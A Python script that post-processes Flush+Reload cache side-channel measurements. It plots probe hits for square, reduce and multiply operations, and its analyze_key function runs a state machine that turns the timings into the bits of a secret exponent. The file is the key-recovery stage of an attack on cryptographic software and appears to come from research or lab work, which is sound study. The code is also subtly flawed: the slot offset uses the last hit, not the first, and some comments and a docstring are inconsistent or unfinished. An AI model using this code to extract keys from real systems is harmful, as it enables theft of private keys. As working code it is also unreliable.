def calc_and_parse_graph():
    from collections import namedtuple, defaultdict
    import csv
    import matplotlib.pyplot as plt

    inputfile =  'out.txt' #static hard coded location, contains the hits and cycles data of the flush+reload attack
    Hit = namedtuple('Hit', ['slot', 'addr', 'time'])
    CUTOFF = 150 #equivalent of THRESHOLD in Yuval Yarom's MASTIK library
    square = {'label': 'Square', 'marker': 'x', 'color': '#FF0059', 'addrs': [0]}
    red = {'label': 'Reduce', 'marker': '.', 'color': '#2C00E8', 'addrs': [1]}
    mult = {'label': 'Multiply', 'marker': '^', 'color': '#00F1FF', 'addrs': [2]}
    hit_types = [square, red, mult]
    '''
    This block parses the hits from the file in the following format:
    cycle        id        recovery_time
    (1-50,000)   (1-4/5)   (30-300 on average)  

    then inserts it into a dictionary for plotting purposes
    '''
    with open(inputfile, 'r') as outfile:
        probereader = csv.reader(outfile, delimiter=' ')
        rows = [Hit(slot=int(row[0]), addr=int(row[1]), time=int(row[2]))
                for row in probereader]
        hits = [row for row in rows if row.time < CUTOFF]
        # seen = {}
        # for hit in hits:
        #     if hit.slot not in seen:
        #         seen[hit.slot] = 0.0
        #     seen[hit.slot] += 1.0
        # print(sum(seen.values()) / len(seen.values()))
        # print("Slots >= 2 {:d}".format(len([s for s in seen.keys() if seen[s] >= 2])))
        # print("Slots == 0 {:d}".format(len([s + 1 for s in seen.keys() if (s + 1) not in seen])))
        # print("Slots, tot {:d}".format(len(seen)))

        addr_counts = defaultdict(int)
        for hit in hits:
            addr_counts[hit.addr + 1] += 1
        print("Counts for each address:", addr_counts)

        multiplies = [hit for hit in hits if hit.addr in mult['addrs']]
        slots_to_multiplies = {}
        for multiply in multiplies:
            slots_to_multiplies[multiply.slot] = multiply
        multiply_slots = sorted(slots_to_multiplies.keys())
        dists = {}
        for i in range(0, len(multiply_slots) - 1):
            dist = multiply_slots[i + 1] - multiply_slots[i]
            if dist not in dists:
                dists[dist] = 0
            dists[dist] += 1
        print("Counts for each distance between subsequent multiplies (in slots)", dists)

        for hit_type in hit_types:
            hits_of_type = [hit for hit in hits if hit.addr in hit_type['addrs']]
            slot_to_hits = {}
            for hit in hits_of_type:
                slot_to_hits[hit.slot] = hit
            print("{:s} {:d}".format(hit_type['label'], len(slot_to_hits.keys())))

        fig = plt.figure()
        axis = fig.add_subplot(111)
        plots = []
        # Somewhat of a hack right now, but we assume that there are 5 addresses
        # range instead of xrange for forwards compatibility
        # Also, have to do each address separately because scatter() does not accept
        # a list of markers >_>
        for hit_type in hit_types:
            addr_hits = [hit for hit in hits if hit.addr in hit_type['addrs']]
            slot_to_hits = {}
            for hit in addr_hits:
                slot_to_hits[hit.slot] = hit
            addr_hits = slot_to_hits.values()
            plot = axis.scatter(
                [hit.slot for hit in addr_hits],
                [hit.time for hit in addr_hits],
                c=hit_type['color'],
                marker=hit_type['marker'],
            )
            plots.append(plot)
        # plt.plot([hit.slot for hit in hits], [hit.time for hit in hits])
        plt.legend(tuple(plots),
                tuple([hit_type['label'] for hit_type in hit_types]),
                scatterpoints=1,
                loc='upper right',
                ncol=1)
        return fig
'''
This next segment is in charge of turning the pile of data in out.txt (cycles, )



'''
def analyze_key(file):
    from collections import namedtuple
    import csv
    import sys

    Hit = namedtuple('Hit', ['slot', 'addr', 'time'])
    CUTOFF = 150
    SQUARE_ADDR = 0
    MODULO_ADDR = 1
    MULTIPLY_ADDR = 2


    class TimeSlot(object):
        __slots__ = ['square', 'modulo', 'multiply']

        def __init__(self):
            self.square = False
            self.modulo = False
            self.multiply = False


    def _read_csv(csvfile):
        with open(csvfile, 'r') as f:
            probereader = csv.reader(f, delimiter=' ')
            return [Hit(slot=int(row[0]), addr=int(row[1]), time=int(row[2]))
                    for row in probereader]

    def _hits_to_timeslots(hits):
        num_slots = hits[-1].slot - hits[0].slot + 1
        offset = hits[-1].slot
        slots = [None] * num_slots
        for hit in hits:
            slot = hit.slot - offset
            if slots[slot] is None:
                slots[slot] = TimeSlot()

            time_slot = slots[slot]
            addr = hit.addr
            if addr == SQUARE_ADDR:
                time_slot.square = True
            elif addr == MODULO_ADDR:
                time_slot.modulo = True
            elif addr == MULTIPLY_ADDR:
                time_slot.multiply = True
            else:
                #raise ValueError("Invalid addr {:d}".format(addr))
                #print("Encountered value of 4, don't know what it is")
                #print("Attempt 1: assuming it is a square")
                #Try not doing anything
                time_slot.modulo = True

        return slots


    def _to_binary(time_slots):
        # We're building a state machine here
        START = 0
        AFTER_SQUARE = 1
        AFTER_SQUARE_MOD = 2
        AFTER_MULTIPLY = 3
        AFTER_SQUARE_MOD_EMPTY = 5

        current_state = START
        output = []
        modulo_count = 0
        for time_slot in time_slots:
            square = time_slot.square if time_slot is not None else None
            modulo = time_slot.modulo if time_slot is not None else None
            multiply = time_slot.multiply if time_slot is not None else None

            if current_state == START:
                modulo_count = 0
                if time_slot is None:
                    continue

                # If we see a multiply, then we don't know what we're looking at.
                if multiply:
                    output.append('_')

                # Only advance if we see a square
                elif square and not multiply:
                    current_state = AFTER_SQUARE

            elif current_state == AFTER_SQUARE:
                # Could end up missing a modulo here
                # If we miss a slot, we probably won't see another square
                if time_slot is None:
                    current_state = AFTER_SQUARE_MOD

                # If we see a multiply so soon after square, it might be invalid
                if multiply:
                    current_state = START
                    output.append('_')

                # Stay if we see another square. Advance if we only see a modulo.
                elif not square and modulo:
                    current_state = AFTER_SQUARE_MOD

            elif current_state == AFTER_SQUARE_MOD:
                if time_slot is None:
                    current_state = AFTER_SQUARE_MOD_EMPTY

                # If we see both square and multiply, it might be invalid
                elif square and multiply:
                    current_state = START
                    output.append('_')

                # If we see a square, return to start and output a 0
                elif square:
                    current_state = START
                    output.append('0')

                elif multiply:
                    current_state = AFTER_MULTIPLY

                elif modulo:
                    modulo_count += 1

            elif current_state == AFTER_SQUARE_MOD_EMPTY:
                if time_slot is None:
                    continue

                # We missed only a modulo
                if multiply:
                    current_state = AFTER_MULTIPLY

                elif modulo:
                    modulo_count += 1

                elif square:
                    current_state = START
                    # If we've seen three modulos already, might be worth marking
                    # this as unknown
                    if modulo_count >= 3:
                        output.append('?')
                    else:
                        # Otherwise, we probably didn't really miss anything
                        # important
                        output.append('0')

            elif current_state == AFTER_MULTIPLY:
                # If we see only a modulo, return to start and output a 1
                # Alternatively, a missed slot could be a modulo
                if time_slot is None or (modulo and not square and not multiply):
                    current_state = START
                    output.append('1')

                # If we see a square so soon, this might be invalid
                elif square:
                    current_state = START
                    output.append('_')

        return output



    hits = _read_csv(file)
    hits = [row for row in hits if row.time < CUTOFF]
    print("Number of hits: {:d}".format(len(hits)), file=sys.stderr)
    print("Time slot range: {:d} - {:d}".format(hits[0].slot, hits[-1].slot),
        file=sys.stderr)

    time_slots = _hits_to_timeslots(hits)
    binary = _to_binary(time_slots)
    return (''.join(binary))

